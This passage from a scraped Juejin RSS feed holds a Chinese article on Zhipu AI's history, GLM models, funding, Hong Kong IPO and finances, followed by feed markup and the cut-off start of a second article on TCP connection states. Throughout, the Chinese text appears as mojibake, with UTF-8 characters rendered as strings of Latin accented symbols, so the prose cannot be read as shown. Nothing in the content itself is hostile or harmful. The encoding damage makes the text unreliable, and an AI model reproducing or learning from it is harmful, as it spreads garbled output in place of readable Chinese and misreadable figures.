<p>2006å¹´ï¼Œæ¸…åå¤§å­¦çŸ¥è¯†å·¥ç¨‹å®éªŒå®¤å¼€å§‹äº†åä¸º <strong>â€œAMinerâ€çš„ç§‘ç ”æƒ…æŠ¥æŒ–æ˜ç³»ç»Ÿ</strong>çš„ç ”ç©¶ï¼Œè¿™ä¸ºæ™ºè°±åæ¥çš„å‘å±•åŸ‹ä¸‹äº†ç¬¬ä¸€é¢—ç§å­ã€‚è¿™ä¸ªç³»ç»Ÿé€šè¿‡äººå·¥æ™ºèƒ½æŠ€æœ¯åˆ†æè‡ªç„¶ç§‘å­¦æˆ–æŠ€æœ¯å‘å±•çš„å®¢è§‚è§„å¾‹ï¼Œæ„å»ºäº†æ—©æœŸçš„çŸ¥è¯†å›¾è°±æ¡†æ¶ã€‚</p>
<p>2019å¹´6æœˆï¼Œå½“åŒ—äº¬æ™ºè°±åç« ç§‘æŠ€æœ‰é™å…¬å¸æ­£å¼æˆç«‹æ—¶ï¼Œå…¬å¸å·²éç™½æ‰‹èµ·å®¶ã€‚<strong>æŠ€æœ¯ç§¯ç´¯ä»æ¸…åå¤§å­¦çŸ¥è¯†å·¥ç¨‹å®éªŒå®¤ç›´æ¥è½¬ç§»</strong>ï¼Œå›¢é˜Ÿäººå‘˜ä¹Ÿå¤§å¤šæ¥è‡ªåŒä¸€å­¦æœ¯èƒŒæ™¯ï¼Œè¿™è®©æ™ºè°±åœ¨åˆ›ä¸šåˆæœŸå°±æ‹¥æœ‰äº†ä¸€æ”¯æ‰å®çš„æŠ€æœ¯å›¢é˜Ÿã€‚</p>
<p>å…¬å¸æœ€åˆä¸»è¦ä¸ºç§‘æŠ€æƒ…æŠ¥åˆ†æå’Œæ•°æ®æŒ–æ˜æä¾›è§£å†³æ–¹æ¡ˆï¼Œä»æˆç«‹ç¬¬ä¸€å¤©èµ·å°±<strong>æ‹¥æœ‰ç¨³å®šçš„æ”¶å…¥æ¥æº</strong>ï¼Œè¿™ç§â€œè‡ªå¸¦å¹²ç²®â€çš„åˆ›ä¸šæ¨¡å¼ä¸ºå¤§æ¨¡å‹ç ”å‘æä¾›äº†å®è´µçš„æ—¶é—´çª—å£ã€‚</p>
<h2 data-id="heading-1">02 æŠ‰æ‹©</h2>
<p>2020å¹´GPT-3å‘å¸ƒåï¼Œå…¨çƒAIç•Œä¸ºä¹‹éœ‡åŠ¨ã€‚å½“æ—¶ï¼Œ<strong>è¿½éšè¥¿æ–¹ä¸»æµæ¶æ„æ˜¯çœ‹èµ·æ¥æœ€å®‰å…¨çš„é€‰æ‹©</strong>ï¼Œä½†æ™ºè°±å›¢é˜Ÿå´é€‰æ‹©äº†å¦ä¸€æ¡é“è·¯ã€‚</p>
<p>â€œå¦‚æœç…§æ¬è¥¿æ–¹æŠ€æœ¯ï¼Œæ„å‘³ç€æ°¸è¿œåªèƒ½è·Ÿéšã€‚â€æ™ºè°±CEOå¼ é¹åœ¨æ—©æœŸè®¿è°ˆä¸­è¡¨è¾¾äº†å¯¹è‡ªä¸»åˆ›æ–°çš„åšæŒã€‚å›¢é˜Ÿå†³å®šå¼€å‘<strong>åŸºäºè‡ªå›å½’å¡«ç©ºçš„GLMé¢„è®­ç»ƒæ¶æ„</strong>ï¼Œè¿™æ˜¯ä¸€æ¡å……æ»¡æœªçŸ¥çš„æŠ€æœ¯è·¯å¾„ã€‚</p>
<p>2021å¹´4æœˆï¼Œæ™ºæºç ”ç©¶é™¢ä»¥ä»·å€¼2037ä¸‡å…ƒçš„çŸ¥è¯†äº§æƒå®Œæˆå¯¹æ™ºè°±çš„å¤©ä½¿è½®æ³¨èµ„ã€‚åŒå¹´ï¼Œæ™ºè°±ä¾¿å‘å¸ƒç™¾äº¿å‚æ•°æ¨¡å‹GLM-10Bï¼Œ<strong>å¸å¼•äº†å›è”èµ„æœ¬ã€å¯æ˜åˆ›æŠ•ç­‰æœºæ„çš„å…³æ³¨</strong>ï¼ŒæˆåŠŸè·å¾—è¿‘2.1äº¿å…ƒçš„B1è½®æŠ•èµ„ã€‚è¿™ä¸€æ­¥ä¸ä»…è§£å†³äº†èµ„é‡‘é—®é¢˜ï¼Œä¹ŸéªŒè¯äº†æŠ€æœ¯è·¯çº¿çš„å¯è¡Œæ€§ã€‚</p>
<h2 data-id="heading-2">03 å¼€æº</h2>
<p>2022å¹´ï¼Œæ™ºè°±å‘å¸ƒå¹¶å¼€æºäº†GLM-130Bæ¨¡å‹ï¼Œè¿™æ˜¯å›½å†…<strong>é¦–ä¸ªåƒäº¿çº§å¼€æºæ¨¡å‹</strong>ï¼Œä¹Ÿæ˜¯å½“å¹´äºšæ´²å”¯ä¸€å…¥é€‰æ–¯å¦ç¦è¯„æµ‹çš„å…¨çƒä¸»æµå¤§æ¨¡å‹ã€‚</p>
<p>è¿™æ¬¡æŠ€æœ¯æŠ¢è·‘ï¼Œè®©æ™ºè°±åœ¨2023å¹´å¼€å§‹çš„â€œç™¾æ¨¡å¤§æˆ˜â€ä¸­å æ®äº†å…ˆæœºã€‚</p>
<p>å¼€æºç­–ç•¥æˆä¸ºæ™ºè°±æ’¬åŠ¨å¸‚åœºçš„é‡è¦æ æ†ã€‚2023å¹´ï¼Œæ™ºè°±ç‡å…ˆå¼€æºChatGLM-6Bï¼Œ<strong>å°†å¤§æ¨¡å‹çš„è¿è¡Œé—¨æ§›é™è‡³æ™®é€šç¬”è®°æœ¬ç”µè„‘çº§åˆ«</strong>ï¼Œå¸å¼•äº†å¤§æ‰¹å¼€å‘è€…æ¶Œå…¥ç”Ÿæ€ã€‚è¿™ç§ä½é—¨æ§›ç­–ç•¥è¿…é€Ÿæ‰©å¤§äº†æ™ºè°±åœ¨å¼€å‘è€…ç¤¾åŒºçš„å½±å“åŠ›ã€‚</p>
<p>2025å¹´ï¼Œæ™ºè°±å°†å¼€æºç­–ç•¥æ¨å‘æè‡´ï¼Œå®£å¸ƒå¼€æº32B/9Bç³»åˆ—æ¨¡å‹ï¼Œå¹¶é‡‡ç”¨å¯¹å•†ä¸šå‹å¥½çš„MITè®¸å¯åè®®ï¼Œå…è®¸ä¼ä¸šå…è´¹å•†ç”¨ã€‚<strong>æ™ºè°±çš„å¼€æºæ¨¡å‹åœ¨å…¨çƒä¸‹è½½é‡å·²è¶…è¿‡6000ä¸‡æ¬¡</strong>ï¼ŒGitHubä¸Šç›¸å…³å¼€æºé¡¹ç›®è¶…2000ä¸ªï¼Œå½¢æˆäº†ä¸­å›½å¤§æ¨¡å‹é¢†åŸŸæœ€æ´»è·ƒçš„å¼€æºç”Ÿæ€ä¹‹ä¸€ã€‚</p>
<h2 data-id="heading-3">04 å•†ä¸šåŒ–</h2>
<p>æ™ºè°±çš„å•†ä¸šåŒ–è·¯å¾„ä½“ç°äº†å…¸å‹çš„æŠ€æœ¯å…¬å¸è½¬å‹è¿‡ç¨‹ã€‚æ—©æœŸèšç„¦Gç«¯ä¸Bç«¯å¸‚åœºï¼ŒæŠ€æœ¯é‡å¿ƒæ”¾åœ¨å¤šæ¨¡æ€æ¨¡å‹ä¸Agentæ™ºèƒ½ä½“ã€‚</p>
<p>æ ¹æ®æ‹›è‚¡ä¹¦æŠ«éœ²ï¼Œ<strong>2025å¹´ä¸ŠåŠå¹´ï¼Œæ™ºè°±è¶…è¿‡å…«æˆè¥æ”¶æ¥æºäºä¸ºæ”¿åºœã€é‡‘èã€èƒ½æºç­‰å¤§å‹å®¢æˆ·æä¾›æœ¬åœ°åŒ–éƒ¨ç½²å’Œå®šåˆ¶åŒ–AIè§£å†³æ–¹æ¡ˆ</strong>ã€‚è¿™ç§æ¨¡å¼å¸¦æ¥å¯è§‚çš„æ”¶å…¥ï¼Œä½†å¯æŒç»­æ€§é¢ä¸´æŒ‘æˆ˜ï¼š2022å¹´è‡³2025å¹´ä¸ŠåŠå¹´çš„å‰äº”å¤§å®¢æˆ·åå•<strong>é‡å¤åº¦æä½</strong>ï¼Œè¡¨æ˜å¤šæ•°å¤§å®¢æˆ·åˆä½œä»åœç•™åœ¨ä¸€æ¬¡æ€§äº¤ä»˜å±‚é¢ã€‚</p>
<p>æ™ºè°±çš„MaaSæ¨¡å¼æ­£åœ¨å½¢æˆæ–°çš„å•†ä¸šåŒ–å¸ƒå±€ã€‚To Bç«¯å·²æ‹¥æœ‰<strong>è¶…è¿‡12000å®¶ä¼ä¸šå®¢æˆ·</strong>ï¼Œä¸­å›½å‰åå¤§äº’è”ç½‘å…¬å¸ä¸­æœ‰9å®¶éƒ½åœ¨ä½¿ç”¨æ™ºè°±GLMï¼›To Dç«¯åˆ™èšé›†äº†<strong>270ä¸‡å¼€å‘è€…</strong>ï¼ŒAPIå¹´æ”¶å…¥å¢é•¿è¶…30å€ã€‚</p>
<p>é’ˆå¯¹AIç¼–ç¨‹åœºæ™¯çš„è®¢é˜…äº§å“â€œGLM Coding planâ€ä¸Šçº¿ä»…ä¸¤ä¸ªæœˆï¼Œ<strong>å…¨çƒä»˜è´¹å¼€å‘è€…ç”¨æˆ·ä¾¿è¶…è¿‡15ä¸‡</strong>ï¼Œå¹´åº¦ç»å¸¸æ€§æ”¶å…¥(ARR)å¿«é€Ÿç ´äº¿ã€‚è¿™ç§ä»ä¸€æ¬¡æ€§é¡¹ç›®åˆ°æŒç»­æœåŠ¡çš„è½¬å‹ï¼Œæ˜¯æ™ºè°±å•†ä¸šæ¨¡å¼æˆç†Ÿçš„å…³é”®æ ‡å¿—ã€‚</p>
<h2 data-id="heading-4">05 èµ„æœ¬</h2>
<p>æ™ºè°±çš„èèµ„å†ç¨‹åæ˜ äº†AIè¡Œä¸šå¯¹èµ„æœ¬çš„é«˜åº¦ä¾èµ–ã€‚ä¸­ç§‘åˆ›æ˜Ÿäº2019å¹´æ³¨èµ„4000ä¸‡å…ƒï¼Œä»¥3.75äº¿å…ƒæŠ•åä¼°å€¼ä¸åˆ›å§‹å›¢é˜Ÿå…±åŒå‘èµ·äº†æ™ºè°±ã€‚<strong>è¾¾æ™¨è´¢æ™ºåˆ™æŒç»­å‚ä¸äº†å¤šè½®èèµ„</strong>ï¼Œç´¯è®¡æŠ•èµ„é‡‘é¢è¾¾1.21äº¿å…ƒã€‚</p>
<p>2022å¹´ChatGPTå‘å¸ƒåï¼Œæ™ºè°±è¿æ¥èèµ„é«˜å³°æœŸã€‚äº§ä¸šèµ„æœ¬ä¸å›½èµ„æœºæ„æˆä¸ºèèµ„ä¸»è§’ï¼š<strong>èš‚èšé›†å›¢é€šè¿‡æ——ä¸‹åŸºé‡‘ç´¯è®¡æŠ•èµ„6äº¿å…ƒ</strong>ï¼›ç¾å›¢åœ¨B2è½®é¢†æŠ•3äº¿å…ƒï¼›è…¾è®¯åœ¨B4è½®é¢†æŠ•2äº¿å…ƒã€‚</p>
<p>2024å¹´è‡³2025å¹´ä¸Šå¸‚å‰ï¼Œ <strong>â€œå›½å®¶é˜Ÿâ€èµ„é‡‘é›†ä¸­è¿›å…¥</strong>ï¼šä»ä¸­å…³æ‘ç§‘å­¦åŸæŠ•èµ„30äº¿å…ƒå¼€å§‹ï¼Œæ­å·åŸæŠ•ã€ä¸ŠåŸèµ„æœ¬ã€ç æµ·åå‘é›†å›¢ã€æˆéƒ½é«˜æ–°åŒºç­‰åœ°æ–¹å›½èµ„ç›¸ç»§æŠ•èµ„ã€‚</p>
<p>æœ€åä¸€è½®èèµ„ï¼Œæ›´æ˜¯æ±‡é›†äº†ä¸­å…³æ‘ç§‘å­¦åŸã€å¤§å…´æŠ•èµ„ã€æ­å·åŸåˆ›ã€åå‘é›†å›¢ã€æˆéƒ½é«˜æ–°æ–°ç»æµåˆ›æŠ•ç­‰ä¸€ä¼—å›½èµ„æœºæ„ï¼Œ<strong>åˆè®¡æ³¨èµ„è¶…20äº¿å…ƒ</strong>ã€‚è¿™ç§å¤šå…ƒåŒ–çš„è‚¡ä¸œç»“æ„ä¸ºæ™ºè°±æä¾›äº†ä¸åŒç»´åº¦çš„èµ„æºæ”¯æŒã€‚</p>
<h2 data-id="heading-5">06 ä¸Šå¸‚</h2>
<p>æ™ºè°±çš„ä¸Šå¸‚ä¹‹è·¯ä½“ç°äº†æˆ˜ç•¥çµæ´»æ€§ã€‚2025å¹´4æœˆï¼Œæ™ºè°±åœ¨åŒ—äº¬è¯ç›‘å±€å®ŒæˆIPOè¾…å¯¼å¤‡æ¡ˆï¼Œç”±ä¸­é‡‘å…¬å¸æ‹…ä»»è¾…å¯¼æœºæ„ï¼Œæˆä¸ºå›½å†…ç¬¬ä¸€å®¶æ­£å¼å¯åŠ¨IPOæµç¨‹çš„å¤§æ¨¡å‹å…¬å¸ã€‚</p>
<p>è®¡åˆ’é¢„è®¡7ä¸ªæœˆå®Œæˆï¼Œç›®æ ‡æ˜¯2025å¹´å†…å®Œæˆä¸Šå¸‚å‰çš„å…¨éƒ¨åˆè§„æµç¨‹ã€‚</p>
<p>ç„¶è€Œï¼Œ2025å¹´7æœˆæƒ…å†µå‡ºç°è°ƒæ•´ï¼Œ<strong>å½­åšç¤¾æŠ¥é“ç§°æ™ºè°±æ­£è¯„ä¼°å°†IPOåœ°ç‚¹ä»å†…åœ°äº¤æ˜“æ‰€è°ƒæ•´è‡³æ¸¯äº¤æ‰€</strong>ã€‚è¿™ä¸€è°ƒæ•´è¿…é€Ÿè½å®ï¼Œ12æœˆ17æ—¥ï¼Œè…¾è®¯æ–°é—»ã€Šä¸€çº¿ã€‹ä»å¤šä¸ªä¿¡æºå¤„è·æ‚‰ï¼Œæ™ºè°±AIå·²äºæœ¬å‘¨åˆå®Œæˆä¸­å›½è¯ç›‘ä¼šå¤‡æ¡ˆï¼Œå¹¶å‚ä¸äº†æ¸¯äº¤æ‰€çš„ä¸Šå¸‚è†è®¯ã€‚</p>
<p>æ‹›è‚¡ä¹¦æŠ«éœ²ï¼Œæ™ºè°±æ­¤æ¬¡è®¡åˆ’å‘è¡Œ3741.95ä¸‡è‚¡Hè‚¡ï¼Œå‹Ÿé›†èµ„é‡‘æ€»é¢çº¦43äº¿æ¸¯å…ƒï¼Œ<strong>IPOå¸‚å€¼è¶…è¿‡511äº¿æ¸¯å…ƒ</strong>ã€‚æ‰€å‹Ÿèµ„é‡‘å‡€é¢çš„70%å°†ç”¨äºé€šç”¨AIå¤§æ¨¡å‹ç ”å‘æŠ•å…¥ï¼Œçº¦10%ç”¨äºä¼˜åŒ–MaaSå¹³å°ã€‚</p>
<p>2025å¹´åº•ï¼Œæ™ºè°±ç»“æŸæ‹›è‚¡ï¼Œåˆ¸å•†ä¸ºå…¶å€Ÿå‡º1978äº¿æ¸¯å…ƒå­–å±•ï¼Œ<strong>ä»¥å…¬å¼€å‘å”®å‹Ÿèµ„é¢è®¡ç®—è¶…é¢è®¤è´­è¾¾910å€</strong>ï¼Œå¸‚åœºååº”çƒ­çƒˆã€‚</p>
<h2 data-id="heading-6">07 ç»è¥</h2>
<p>æ™ºè°±çš„è´¢åŠ¡æ•°æ®æ­ç¤ºäº†AIå¤§æ¨¡å‹è¡Œä¸šçš„å…±åŒç‰¹å¾ï¼šé«˜å¢é•¿ä¼´éšé«˜æŠ•å…¥ã€‚</p>
<p>è¥æ”¶æ–¹é¢ï¼Œ2022å¹´è‡³2024å¹´ï¼Œ<strong>æ™ºè°±æ”¶å…¥åˆ†åˆ«ä¸º5740ä¸‡å…ƒã€1.245äº¿å…ƒã€3.124äº¿å…ƒ</strong>ï¼Œå¹´å¤åˆå¢é•¿ç‡é«˜è¾¾130%ï¼›2025å¹´ä¸ŠåŠå¹´è¥æ”¶åŒæ¯”å¢å¹…æ›´æ˜¯è¾¾åˆ°325%ã€‚æ¯›åˆ©ç‡ä¿æŒåœ¨è¾ƒé«˜æ°´å¹³ï¼Œ2023å¹´è¾¾åˆ°64.6%ã€‚</p>
<p>äºæŸåŒæ ·æ˜¾è‘—ã€‚è¿‡å»ä¸‰å¹´ï¼Œ<strong>æ™ºè°±ç»è°ƒæ•´å‡€äºæŸåˆ†åˆ«ä¸º0.97äº¿ã€6.21äº¿ä»¥åŠ24.66äº¿å…ƒ</strong>ï¼ŒäºæŸå¹…åº¦å¢é•¿è¶…è¿‡20å€ã€‚2025å¹´ä¸ŠåŠå¹´äºæŸå°±é«˜è¾¾17.52äº¿å…ƒï¼Œå¹³å‡æ¯æœˆäºæŸæ¥è¿‘3äº¿å…ƒã€‚</p>
<p>ç ”å‘æŠ•å…¥æ˜¯é«˜é¢äºæŸçš„ä¸»è¦åŸå› ã€‚2022å¹´è‡³2024å¹´ï¼Œ<strong>æ™ºè°±çš„ç ”å‘å¼€æ”¯ä»8440ä¸‡å…ƒé£™å‡è‡³21.95äº¿å…ƒ</strong>ï¼Œ2025å¹´ä¸ŠåŠå¹´ç ”å‘æŠ•å…¥è¿›ä¸€æ­¥å¢è‡³15.95äº¿å…ƒï¼Œç´¯è®¡ç ”å‘æŠ•å…¥è¶…44äº¿å…ƒã€‚<strong>ç®—åŠ›æˆæœ¬å ç ”å‘å¼€æ”¯çš„æ¯”ä¾‹ä»17.3%é£™å‡è‡³70.7%</strong>ï¼Œ2024å¹´çš„ç®—åŠ›æœåŠ¡è´¹è¾¾åˆ°15.5äº¿å…ƒã€‚</p>
<p>æˆªè‡³2025å¹´6æœˆï¼Œæ™ºè°±çš„ç°é‡‘åŠç°é‡‘ç­‰ä»·ç‰©ä»…å‰©25.52äº¿å…ƒã€‚æŒ‰æ¯æœˆ3äº¿çš„çƒ§é’±é€Ÿåº¦è®¡ç®—ï¼Œè‹¥æ— æ–°èµ„é‡‘æ³¨å…¥ï¼Œç°é‡‘æµä»…èƒ½æ”¯æ’‘çº¦9ä¸ªæœˆã€‚è¿™ç§èµ„é‡‘å‹åŠ›æ˜¯ä¿ƒä½¿æ™ºè°±åŠ é€Ÿä¸Šå¸‚è¿›ç¨‹çš„é‡è¦å› ç´ ã€‚</p>
<h2 data-id="heading-7">08 æœªæ¥</h2>
<p>ä¸Šå¸‚å½“å¤©ï¼Œæ™ºè°±é¦–å¸­ç§‘å­¦å®¶å”æ°åœ¨å†…éƒ¨ä¿¡ä¸­å®£å¸ƒï¼Œå°†å¾ˆå¿«æ¨å‡ºæ–°ä¸€ä»£æ¨¡å‹GLM-5ã€‚å”æ°ç‰¹åˆ«æåˆ°ï¼Œ<strong>è¡Œä¸šç«äº‰ç»™ä»–å¸¦æ¥è­¦é†’</strong>ï¼Œè¡¨ç¤ºéœ€è¦ä¸æ–­æ”¹è¿›å¯¹AGIæŠ€æœ¯çš„è¿½æ±‚å’Œæœªæ¥é¢„åˆ¤èƒ½åŠ›ã€‚</p>
<p>æ™ºè°±è®¡åˆ’åœ¨2026å¹´èšç„¦å››å¤§æ–¹å‘ï¼šæ¨å‡ºGLM-5æ¨¡å‹ï¼›<strong>æ¢ç´¢è¶…è¶ŠTransformerçš„å…¨æ–°æ¨¡å‹æ¶æ„</strong>ï¼›ç ”å‘å…·æœ‰æ›´å¼ºæ³›åŒ–èƒ½åŠ›çš„å¼ºåŒ–å­¦ä¹ èŒƒå¼ï¼›å¼€å¯æŒç»­å­¦ä¹ ä¸è‡ªä¸»è¿›åŒ–çš„é“è·¯ï¼Œå¸ƒå±€ä¸‹ä¸€ä»£åœ¨çº¿å­¦ä¹ æŠ€æœ¯ã€‚</p>
<p>åŒæ—¶ï¼Œå”æ°é€éœ²æ™ºè°±æ–°è®¾å‰æ²¿æ¢ç´¢éƒ¨é—¨X-Labï¼Œ<strong>èšç„¦å…¨æ–°æ¨¡å‹æ¶æ„ã€è®¤çŸ¥èŒƒå¼ç ”å‘ä¸æ–°é¡¹ç›®å­µåŒ–</strong>ï¼Œè¦†ç›–è½¯ç¡¬ä»¶é¢†åŸŸï¼›åŒæ—¶å°†æ‰©å¤§å¯¹å¤–æŠ•èµ„ï¼Œæ‹“å±•æ–°èµ›é“ä»¥æ¨åŠ¨è¡Œä¸šç”Ÿæ€å…±è£ã€‚</p>
<hr/>
<p>åœ¨GLM-4.7æ¨¡å‹ä¸­ï¼Œæ™ºè°±é’ˆå¯¹ç¼–ç¨‹åœºæ™¯<strong>å¼ºåŒ–äº†ç¼–ç èƒ½åŠ›ã€é•¿ç¨‹ä»»åŠ¡è§„åˆ’ä¸å·¥å…·ååŒ</strong>ï¼Œåœ¨å¤šé¡¹æƒå¨è¯„æµ‹ä¸­ä½åˆ—å¼€æºç¬¬ä¸€ã€‚è¿™äº›æŠ€æœ¯åˆ›æ–°ä¸ºç”¨æˆ·æä¾›äº†æ›´é«˜æ•ˆçš„å·¥å…·é€‰æ‹©ã€‚</p>
<p>æ™ºè°±å·²ä¸ä¸­å›½ä¸‰æ˜Ÿåˆä½œï¼Œå°†AIèƒ½åŠ›æ¤å…¥Galaxy S25ç³»åˆ—ï¼Œç›´æ¥è§¦è¾¾æ¶ˆè´¹è€…ï¼Œè¿˜åœ¨ç æµ·é«˜æ–°åŒºæŠ•å…¥åº”ç”¨â€œæ™ºè°±å²—äº­æœºå™¨äººâ€ï¼Œæˆä¸ºå¤§æ¨¡å‹æŠ€æœ¯èµ‹èƒ½åŸºå±‚å®‰é˜²çš„æ ‡æ†æ¡ˆä¾‹ã€‚</p>
<p><strong>ä¸€åœºæŒç»­æ¶ˆè€—èµ„æœ¬çš„æ— é™æ¸¸æˆä¸­ï¼ŒIPOåªæ˜¯æ™ºè°±è¡¥å……ç‡ƒæ–™çš„æ‰‹æ®µ</strong>ã€‚åœ¨æ¿€çƒˆçš„è¡Œä¸šç«äº‰ä¸­ï¼Œæ™ºè°±çš„ä¸Šå¸‚æ„å‘³ç€æ‹¿åˆ°äº†ä¸‹ä¸€é˜¶æ®µç«äº‰çš„å…¥åœºåˆ¸ï¼Œä½†è¿™è¿œä¸æ˜¯ç»ˆç‚¹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TCP è¿æ¥çŠ¶æ€è¯¦è§£]]></title>    <link>https://juejin.cn/post/7592789801708994601</link>    <guid>https://juejin.cn/post/7592789801708994601</guid>    <pubDate>2026-01-08T09:57:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592789801708994601" data-draft-id="7592572266754654271" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TCP è¿æ¥çŠ¶æ€è¯¦è§£"/> <meta itemprop="keywords" content="ç½‘ç»œåè®®"/> <meta itemprop="datePublished" content="2026-01-08T09:57:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·37282486022"/> <meta itemprop="url" content="https://juejin.cn/user/3986167592132954"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TCP è¿æ¥çŠ¶æ€è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3986167592132954/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·37282486022
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:57:45.000Z" title="Thu Jan 08 2026 09:57:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>TCP è¿æ¥çŠ¶æ€ç”± <strong>RFC 793</strong> å®šä¹‰ï¼Œå…± <strong>11 ç§æ ‡å‡†çŠ¶æ€</strong>ã€‚ä»¥ä¸‹æŒ‰è¿æ¥ç”Ÿå‘½å‘¨æœŸè¯¦ç»†è§£é‡Šï¼š</p>
<hr/>
<h2 data-id="heading-0"><strong>1. è¿æ¥å»ºç«‹é˜¶æ®µ</strong></h2>
<h3 data-id="heading-1"><strong>LISTEN (ç›‘å¬)</strong></h3>
<ul>
